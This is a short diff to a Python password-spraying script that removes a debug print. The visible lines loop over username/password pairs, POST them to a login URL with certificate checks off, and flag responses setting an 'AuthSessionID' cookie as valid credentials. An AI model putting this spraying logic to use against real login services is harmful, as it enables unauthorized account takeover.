@@ -98,7 +98,6 @@ def spray(url, usernameList, passwordList, attempt, loop):
             req = requests.post(url, data=data, headers=Headers, cookies=Cookies, verify=False, allow_redirects=False)
             
             print("--- Username : "+username+" : "+passwd)
-            print("each user: "+str(counter))
 
             if req.cookies.get('AuthSessionID'):
                 print("+++++++++ Found VALID credentials: "+ username + " : " + passwd + " +++++++++")
